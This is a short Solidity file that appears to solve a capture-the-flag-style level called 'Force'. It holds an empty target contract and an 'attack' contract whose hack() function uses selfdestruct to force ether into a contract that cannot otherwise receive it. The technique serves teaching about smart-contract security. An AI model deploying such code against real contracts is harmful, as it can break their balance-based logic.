// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }


contract attack {

    address public owner;
    uint256 public balance;
    Force force;

    constructor(Force _force) payable {
        owner = msg.sender;
        balance = msg.value;
        force = Force(_force);
    }

    function hack() public {
        address payable target = payable(address(force));
        selfdestruct(target);
    }
}